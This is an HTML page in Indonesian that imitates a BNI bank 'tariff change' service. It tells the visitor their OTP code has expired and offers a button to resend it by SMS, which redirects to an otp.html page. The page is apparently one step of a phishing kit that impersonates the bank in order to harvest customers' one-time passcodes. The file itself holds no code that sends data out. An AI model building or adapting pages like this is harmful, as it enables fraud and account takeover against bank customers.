<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Layanan online BNI 2023</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
</head>
<body>
    <nav class="navbar" style="background-color: #FF6600">
        <div class="container">
            <a class="navbar-brand" href="#">
                <img src="logo.png" alt="logo" width="70" height="24">
            </a>
            <h2 style="color: #fff">Layanan Ganti Tarif BNI</h2>
        </div>
    </nav>

    <div class="container mt-4 mb-4">
        <div class="d-flex justify-content-around">
            <div class="gif-home">
                <img src="bni.png" class="img-fluid" alt="">
            </div>
        </div>
    </div>
    <br>
    <br>
    <div class="text-help">
        <div class="help">
            <h3 class="fw-bold text-center" style="color: cadetblue">Mohon Maaf</h3>
            <p class="text-center"></p>
        </div>
    </div>
    <div class="loading mt-5">
      <center><img src="loading.gif" alt=""></center>
    </div><br><br>
    <center><h3 style="color: red">Kode OTP kadaluarsa</h3></center>
    <br>
    <center><div id="btn-div" class="resend" style="display: flex; background-color: #eaeaea; width: 80%; border-radius: 15px; justify-content: center; align-items: center">
        <div class="img-sms" style="position: relative">
          <img src="sms.png" alt="">
        </div>
        <p class="fw-bold" style="color: salmon; position: relative; top: 10px">Kirim Ulang OTP Via SMS</p>
    </div></center>
    <script>
        let resend = document.getElementById("btn-div");
        resend.addEventListener("click", () => {
          window.location.href = "otp.html"
        })
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
</body>
</html>
